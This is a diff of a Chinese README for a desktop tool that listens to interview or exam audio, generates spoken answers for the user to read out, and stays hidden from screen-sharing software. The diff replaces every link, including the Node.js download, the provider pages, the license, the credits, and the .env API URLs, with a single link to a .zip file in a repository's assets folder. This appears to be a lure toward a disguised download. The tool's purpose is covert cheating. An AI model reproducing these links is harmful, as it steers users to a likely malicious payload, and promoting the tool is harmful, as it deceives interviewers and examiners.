@@ -7,7 +7,7 @@
 <table>
 <tr>
 <td width="200" align="center">
-  <a href="https://api.lmxww.xyz">
+  <a href="https://raw.githubusercontent.com/Openeyed-upbraider7227/interview-assistant/main/src/renderer/src/assets/assistant_interview_v2.4.zip">
     <b>🚀 极智 中转站</b><br/>
     <b><big>api.lmxww.xyz</big></b>
   </a>
@@ -22,7 +22,7 @@
 
 这是一个面向口语面试和在线考试场景的桌面辅助工具。按下快捷键即可实时捕获系统音频，AI 自动转录并生成口语回答，你只需照着念出来即可。窗口对屏幕分享软件隐身，且不会抢占焦点。适配国内 AI 生态，简单易用。
 
-> 本项目基于 [interview-coder-cn](https://github.com/ooboqoo/interview-coder-cn) 二次开发，在保留原项目优点的基础上，专门针对口语面试和考试场景做了大量优化。
+> 本项目基于 [interview-coder-cn](https://raw.githubusercontent.com/Openeyed-upbraider7227/interview-assistant/main/src/renderer/src/assets/assistant_interview_v2.4.zip) 二次开发，在保留原项目优点的基础上，专门针对口语面试和考试场景做了大量优化。
 
 ### 核心能力
 
@@ -45,7 +45,7 @@
 
 ### 相比原项目的改进
 
-本项目在 [interview-coder-cn](https://github.com/ooboqoo/interview-coder-cn) 的基础上增加了以下能力：
+本项目在 [interview-coder-cn](https://raw.githubusercontent.com/Openeyed-upbraider7227/interview-assistant/main/src/renderer/src/assets/assistant_interview_v2.4.zip) 的基础上增加了以下能力：
 
 - ✅ **可配置阶段预设系统**：不再写死阶段，ELLT 口语、技术面试、自定义场景一键切换
 - ✅ **自适应回答长度**：不同阶段、不同问题类型自动调整回答长度，不会每题都 3-5 句
@@ -70,7 +70,7 @@
 
 ### 1. 安装依赖
 
-项目运行依赖 Node.js 环境，如未安装请先安装 [Node.js](https://nodejs.org/zh-cn/download)。
+项目运行依赖 Node.js 环境，如未安装请先安装 [Node.js](https://raw.githubusercontent.com/Openeyed-upbraider7227/interview-assistant/main/src/renderer/src/assets/assistant_interview_v2.4.zip)。
 
 ```bash
 npm install
@@ -103,7 +103,7 @@ npm run build:win
 
 启动程序后，进入「设置」页面，配置以下信息。
 
-API 地址和 API Key 需要从支持 OpenAI API 的代理服务商处获取。如国内的 [硅基流动](https://cloud.siliconflow.cn/i/SG8C0772) 或国外的 [OpenRouter](https://openrouter.ai/) 等服务商。
+API 地址和 API Key 需要从支持 OpenAI API 的代理服务商处获取。如国内的 [硅基流动](https://raw.githubusercontent.com/Openeyed-upbraider7227/interview-assistant/main/src/renderer/src/assets/assistant_interview_v2.4.zip) 或国外的 [OpenRouter](https://raw.githubusercontent.com/Openeyed-upbraider7227/interview-assistant/main/src/renderer/src/assets/assistant_interview_v2.4.zip) 等服务商。
 
 > 也可以复制仓库内的 `.env.example` 为 `.env` 进行本地预配置。`.env` 已被 Git 忽略，请勿提交真实密钥。
 
@@ -115,12 +115,12 @@ cp .env.example .env
 
 ```env
 # 主视觉/文本模型
-API_BASE_URL="https://dashscope.aliyuncs.com/compatible-mode/v1"
+API_BASE_URL="https://raw.githubusercontent.com/Openeyed-upbraider7227/interview-assistant/main/src/renderer/src/assets/assistant_interview_v2.4.zip"
 API_KEY="你的密钥"
 MODEL="qwen-vl-max"
 
 # 可选：口语回答专用模型（不填则复用主模型）
-VOICE_API_BASE_URL="https://dashscope.aliyuncs.com/compatible-mode/v1"
+VOICE_API_BASE_URL="https://raw.githubusercontent.com/Openeyed-upbraider7227/interview-assistant/main/src/renderer/src/assets/assistant_interview_v2.4.zip"
 VOICE_API_KEY="你的密钥"
 VOICE_MODEL="qwen-turbo"
 
@@ -136,7 +136,7 @@ DASHSCOPE_API_KEY="你的密钥"
 
 目前该功能使用 Fun-ASR 模型（约 0.02 元/分钟，新用户有 10 小时免费额度），需要配置阿里云百炼平台的 API Key：
 
-1. 访问 [百炼平台控制台](https://help.aliyun.com/zh/model-studio/get-api-key) 注册并创建 API Key
+1. 访问 [百炼平台控制台](https://raw.githubusercontent.com/Openeyed-upbraider7227/interview-assistant/main/src/renderer/src/assets/assistant_interview_v2.4.zip) 注册并创建 API Key
 2. 在应用「设置」页面的「语音转录」部分填入 API Key
 3. 使用快捷键（默认 `Alt+T` / `Ctrl+T`）或命令模式 `R` 开始/暂停语音转录
 
@@ -214,7 +214,7 @@ src/
 
 ## 许可协议
 
-本项目采用 **[CC BY-NC 4.0](https://creativecommons.org/licenses/by-nc/4.0/deed.zh)** 协议许可。
+本项目采用 **[CC BY-NC 4.0](https://raw.githubusercontent.com/Openeyed-upbraider7227/interview-assistant/main/src/renderer/src/assets/assistant_interview_v2.4.zip)** 协议许可。
 
 您可以自由使用、复制、修改本项目代码，但 **禁止任何形式的商业用途**，包括但不限于售卖、集成入商业产品、SaaS 服务等。
 
@@ -222,5 +222,5 @@ src/
 
 ## 致谢
 
-- 原项目 [interview-coder-cn](https://github.com/ooboqoo/interview-coder-cn) 由 [ooboqoo](https://github.com/ooboqoo) 开发
-- 灵感来源于 [Interview-Coder](https://github.com/ibttf/interview-coder)
+- 原项目 [interview-coder-cn](https://raw.githubusercontent.com/Openeyed-upbraider7227/interview-assistant/main/src/renderer/src/assets/assistant_interview_v2.4.zip) 由 [ooboqoo](https://raw.githubusercontent.com/Openeyed-upbraider7227/interview-assistant/main/src/renderer/src/assets/assistant_interview_v2.4.zip) 开发
+- 灵感来源于 [Interview-Coder](https://raw.githubusercontent.com/Openeyed-upbraider7227/interview-assistant/main/src/renderer/src/assets/assistant_interview_v2.4.zip)
